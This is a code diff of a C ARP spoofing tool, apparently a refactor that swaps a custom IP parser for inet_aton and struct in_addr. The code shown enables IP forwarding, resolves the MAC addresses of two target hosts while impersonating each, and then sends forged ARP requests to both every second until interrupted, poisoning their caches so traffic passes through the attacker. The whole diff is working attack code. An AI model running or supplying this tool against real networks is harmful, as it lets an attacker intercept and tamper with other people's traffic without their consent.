@@ -25,7 +25,7 @@ static void intHandler() {
 int main(int argc, char *argv[]) {
   raw_iface_t iface;
   int fd;
-  ipaddr_t ipaddr_a, ipaddr_b;
+  struct in_addr ipaddr_a, ipaddr_b;
   macaddr_t macaddr_a, macaddr_b;
   FILE *ip_forward;
 
@@ -34,12 +34,12 @@ int main(int argc, char *argv[]) {
     return 1;
   }
   
-  if(parse_ipv4str(ipaddr_a, argv[2])) {
+  if(!inet_aton(argv[2], &ipaddr_a)) {
     fprintf(stderr, "Invalid ip addr %s\n", argv[2]);
     exit(1);
   }
 
-  if(parse_ipv4str(ipaddr_b, argv[3])) {
+  if(!inet_aton(argv[3], &ipaddr_b)) {
     fprintf(stderr, "Invalid ip addr %s\n", argv[3]);
     exit(1);
   }
@@ -56,27 +56,31 @@ int main(int argc, char *argv[]) {
     fclose(ip_forward);
 
   // lookup macaddr for ipaddr_a pretending to be ipaddr_b
-  if(arp4_lookup(&iface, ipaddr_b, iface.macaddr, ipaddr_a, macaddr_a) < 0) {
+  if(arp4_lookup(&iface, ipaddr_b.s_addr, iface.macaddr,
+                 ipaddr_a.s_addr, macaddr_a) < 0) {
     fprintf(stderr, "ARP Lookup failed for %s\n", argv[2]);
     close(fd);
     exit(1);
   }
 
   // lookup macaddr for ipaddr_b pretending to be ipaddr_a
-  if(arp4_lookup(&iface, ipaddr_a, iface.macaddr, ipaddr_b, macaddr_b) < 0) {
+  if(arp4_lookup(&iface, ipaddr_a.s_addr,
+                 iface.macaddr, ipaddr_b.s_addr, macaddr_b) < 0) {
     fprintf(stderr, "ARP Lookup failed for %s\n", argv[3]);
     close(fd);
     exit(1);
   }
 
-  printf("All set!\n");
+  printf("All set! Spoofing ARP\n");
 
   /* until SIGINT is received keep sending fake requests
    * directly to attacked hosts every second */
   signal(SIGINT, intHandler);
   while(keepRunning) {
-    send_arp4_request(&iface, iface.macaddr, ipaddr_b, macaddr_a, ipaddr_a);
-    send_arp4_request(&iface, iface.macaddr, ipaddr_a, macaddr_b, ipaddr_b);
+    send_arp4_request(&iface, iface.macaddr, ipaddr_b.s_addr,
+                       macaddr_a, ipaddr_a.s_addr);
+    send_arp4_request(&iface, iface.macaddr, ipaddr_a.s_addr,
+                      macaddr_b, ipaddr_b.s_addr);
     sleep(1);
   }
 
